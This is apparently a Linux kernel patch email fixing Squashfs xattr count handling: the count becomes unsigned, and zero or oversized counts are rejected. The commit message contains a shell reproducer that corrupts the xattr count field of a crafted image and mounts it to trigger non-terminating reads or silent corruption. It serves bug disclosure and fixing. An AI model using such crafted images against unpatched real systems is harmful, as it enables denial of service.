@@ -1,0 +1,265 @@
+From: Phillip Lougher <phillip@squashfs.org.uk>
+Date: Wed, 11 Nov 2026 23:43:52 +0000
+Subject: [PATCH] Squashfs: widen xattr count variables and add sanity check
+
+The maximum number of Xattrs in an inode is 2^32-1 in Squashfs.  However
+the code incorrectly treats the count as signed, or 2^31-1.
+
+This means any value above 2^31-1 becomes a negative number, and it
+means loops will not terminate due to the negative comparison.  This
+means the code will continue reading the filesystem until either the
+data is incorrect, or the end of the filesystem is reached.
+
+The code also lacks a check that the count is too large, which will
+again mean that the code will continue reading the filesystem.
+
+Finally, the code also lacks a check for a zero count, this means
+anything reading xattrs from the inode will successfully read no xattrs,
+even though this should have returned error due to corruption.
+
+This commit changes the variables to be unsigned, and so negative values
+do not occur, and it first adds a sanity check for a zero xattr count,
+and second checks that the count isn't larger than the xattr size.
+
+Reproducer
+==========
+
+This reproducer allows both zero, negative and large xattr count to be
+reproduced.  In the case of a negative or large count, the exploit
+succeeds if dmesg shows the code failed to read a metadata block, due to
+the loop not terminating.  In the case of a zero count, the exploit
+succeeds if gerfattr successfully returns with no xattrs.
+
+====================================================================
+
+finish() {
+	popd 2>&1 > /dev/null
+	rm -rf $DIR
+	exit 1
+}
+
+if [ $# -lt 1 ]; then
+	echo This needs a parameter
+	echo $0 N/0/L
+	echo N reproduce negative xattr count
+	echo 0 reproduce 0 xattr count
+	echo L reproduce a large count
+	exit 1
+fi
+
+if [ $1 = "N" ]; then
+	echo Reproducing negative xattr count
+elif [ $1 = "0" ]; then
+	echo Reproducing 0 xattr count
+elif [ $1 = "L" ]; then
+	echo Reproducing large xattr count
+else
+	echo Input not N, 0 or L
+	exit 1
+fi
+
+DIR=$(mktemp -d)
+
+pushd $DIR 2>&1 > /dev/null
+
+echo Create a Squashfs pseudo file which is fed to Mksquashfs
+
+echo "/ d 0777 0 0" > pseudo
+echo "example f 0777 0 0 echo example data" >> pseudo
+echo "example x user.comment=example xattr" >> pseudo
+
+echo Generate the Squashfs filesystem
+
+mksquashfs - img.sqsh -pf pseudo -quiet -no-progress -noX
+
+low=$(dd if=img.sqsh bs=1 skip=56 count=1 status=none | od -An -v -tu1 | tr -d '\n')
+hi=$(dd if=img.sqsh bs=1 skip=57 count=1 status=none | od -An -v -tu1 | tr -d '\n')
+start=$(( $hi * 256 + $low ))
+
+(( start -= 8 ))
+
+if [ $1 = "N" ]; then
+	# Write -1 to the count field
+	echo Writing -1 to the count field
+	echo -ne "\xff\xff\xff\xff" > file
+elif [ $1 = "0" ]; then
+	# Write 0 to the count field
+	echo Writing 0 to the count field
+	echo -ne "\x00\x00\x00\x00" > file
+else
+	# Write 255 to the count field
+	echo Writing 255 to the count field
+	echo -ne "\xff\x00\x00\x00" > file
+fi
+
+dd if=file of=img.sqsh bs=1 seek=$start count=4 conv=notrunc status=none
+
+echo Mount the filesystem to /mnt
+
+if ! mount -t squashfs img.sqsh /mnt; then
+	echo Mount of Squashfs filesystem failed
+	finish
+fi
+
+if [ $1 = "0" ]; then
+	if ! getfattr /mnt/example > output; then
+		echo Exploit failed, getfattr returned error
+	elif [ ! -s output ]; then
+		echo Exploit succeeded, getfattr returned success with no xattrs
+	else
+		echo Getfattr succeeded with some xattrs.  The filesystem was not corrupted
+	fi
+else
+	if ! getfattr /mnt/example; then
+		echo Getfattr failed, this is expected.
+		echo If dmesg shows the following, then the exploit succeeded
+		echo SQUASHFS error: Failed to read block 0x124: -5
+		echo SQUASHFS error: Unable to read metadata cache entry [122]
+	else
+		echo Getfattr succeeded with some xattrs.  The filesystem was not corrupted
+	fi
+fi
+
+popd 2>&1 > /dev/null
+rm -rf $DIR
+exit 0
+====================================================================
+
+Link: https://lore.kernel.org/20261111234402.252354-13-phillip@squashfs.org.uk
+Fixes: f41d207cbede ("squashfs: add support for xattr reading")
+Signed-off-by: Phillip Lougher <phillip@squashfs.org.uk>
+Signed-off-by: Andrew Morton <akpm@linux-foundation.org>
+Cc: Phillip Lougher <phillip.lougher@gmail.com>
+---
+ fs/squashfs/inode.c         |  2 +-
+ fs/squashfs/squashfs_fs_i.h |  2 +-
+ fs/squashfs/xattr.c         | 27 ++++++++++++++++++++-------
+ fs/squashfs/xattr.h         |  6 +++---
+ fs/squashfs/xattr_id.c      |  3 ++-
+ 5 files changed, 27 insertions(+), 13 deletions(-)
+
+diff --git a/fs/squashfs/inode.c b/fs/squashfs/inode.c
+index 547eb04f66bdf..812e4ad0d0b63 100644
+--- a/fs/squashfs/inode.c
++++ b/fs/squashfs/inode.c
+@@ -448,7 +448,7 @@ int squashfs_read_inode(struct inode *inode, long long ino)
+ 		inode->i_blocks += ((squashfs_i(inode)->xattr_size - 1) >> 9)
+ 				+ 1;
+ 	} else
+-		squashfs_i(inode)->xattr_count = 0;
++		squashfs_i(inode)->xattr = SQUASHFS_INVALID_BLK;
+ 
+ 	return 0;
+ 
+diff --git a/fs/squashfs/squashfs_fs_i.h b/fs/squashfs/squashfs_fs_i.h
+index 8e497ac07b9a8..90c3b085ac0e5 100644
+--- a/fs/squashfs/squashfs_fs_i.h
++++ b/fs/squashfs/squashfs_fs_i.h
+@@ -15,7 +15,7 @@ struct squashfs_inode_info {
+ 	int		offset;
+ 	u64		xattr;
+ 	unsigned int	xattr_size;
+-	int		xattr_count;
++	unsigned int	xattr_count;
+ 	int		parent;
+ 	union {
+ 		struct {
+diff --git a/fs/squashfs/xattr.c b/fs/squashfs/xattr.c
+index f9ef669544f8b..d7247648ac350 100644
+--- a/fs/squashfs/xattr.c
++++ b/fs/squashfs/xattr.c
+@@ -33,13 +33,16 @@ ssize_t squashfs_listxattr(struct dentry *d, char *buffer,
+ 	u64 start = squashfs_xattr_blk(squashfs_i(inode)->xattr)
+ 						+ msblk->xattr_table;
+ 	int offset = squashfs_xattr_offset(squashfs_i(inode)->xattr);
+-	int count = squashfs_i(inode)->xattr_count;
++	unsigned int count = squashfs_i(inode)->xattr_count;
+ 	size_t rest = buffer_size;
+ 	int err;
+ 
+-	/* check that the file system has xattrs */
+-	if (msblk->xattr_id_table == NULL)
+-		return -EOPNOTSUPP;
++	/* check that the file has xattrs */
++	if (squashfs_i(inode)->xattr == SQUASHFS_INVALID_BLK)
++		return 0;
++
++	if (count == 0 || count > squashfs_i(inode)->xattr_size)
++		return -EIO;
+ 
+ 	/* loop reading each xattr name */
+ 	while (count--) {
+@@ -111,12 +114,21 @@ static int squashfs_xattr_get(struct inode *inode, int name_index,
+ 	u64 start = squashfs_xattr_blk(squashfs_i(inode)->xattr)
+ 						+ msblk->xattr_table;
+ 	int offset = squashfs_xattr_offset(squashfs_i(inode)->xattr);
+-	int count = squashfs_i(inode)->xattr_count;
++	unsigned int count = squashfs_i(inode)->xattr_count;
+ 	int name_len = strlen(name);
+ 	int err, vsize;
+-	char *target = kmalloc(name_len, GFP_KERNEL);
++	char *target;
++
++	/* check that the file has xattrs */
++	if (squashfs_i(inode)->xattr == SQUASHFS_INVALID_BLK)
++		return -ENODATA;
++
++	if (count == 0 || count > squashfs_i(inode)->xattr_size)
++		return -EIO;
++
++	target = kmalloc(name_len, GFP_KERNEL);
+ 	if (target == NULL)
+-		return  -ENOMEM;
++		return -ENOMEM;
+ 
+ 	/* loop reading each xattr name */
+ 	for (; count; count--) {
+@@ -169,6 +181,7 @@ static int squashfs_xattr_get(struct inode *inode, int name_index,
+ 				goto failed;
+ 
+ 			vsize = le32_to_cpu(val.vsize);
++
+ 			if (buffer) {
+ 				if (vsize > buffer_size) {
+ 					err = -ERANGE;
+diff --git a/fs/squashfs/xattr.h b/fs/squashfs/xattr.h
+index f1a463d8bfa02..b33e9ad4057fb 100644
+--- a/fs/squashfs/xattr.h
++++ b/fs/squashfs/xattr.h
+@@ -11,8 +11,8 @@
+ #ifdef CONFIG_SQUASHFS_XATTR
+ extern __le64 *squashfs_read_xattr_id_table(struct super_block *, u64,
+ 		u64 *, unsigned int *);
+-extern int squashfs_xattr_lookup(struct super_block *, unsigned int, int *,
+-		unsigned int *, unsigned long long *);
++extern int squashfs_xattr_lookup(struct super_block *, unsigned int,
++		unsigned int *, unsigned int *, unsigned long long *);
+ #else
+ static inline __le64 *squashfs_read_xattr_id_table(struct super_block *sb,
+ 		u64 start, u64 *xattr_table_start, unsigned int *xattr_ids)
+@@ -31,7 +31,7 @@ static inline __le64 *squashfs_read_xattr_id_table(struct super_block *sb,
+ }
+ 
+ static inline int squashfs_xattr_lookup(struct super_block *sb,
+-		unsigned int index, int *count, unsigned int *size,
++		unsigned int index, unsigned int *count, unsigned int *size,
+ 		unsigned long long *xattr)
+ {
+ 	return 0;
+diff --git a/fs/squashfs/xattr_id.c b/fs/squashfs/xattr_id.c
+index ff85247e2d808..621777e0a3b4f 100644
+--- a/fs/squashfs/xattr_id.c
++++ b/fs/squashfs/xattr_id.c
+@@ -27,7 +27,8 @@
+  * Map xattr id using the xattr id look up table
+  */
+ int squashfs_xattr_lookup(struct super_block *sb, unsigned int index,
+-		int *count, unsigned int *size, unsigned long long *xattr)
++		unsigned int *count, unsigned int *size,
++		unsigned long long *xattr)
+ {
+ 	struct squashfs_sb_info *msblk = sb->s_fs_info;
+ 	int block = squashfs_xattr_block(index);
+-- 
+2.47.3
+
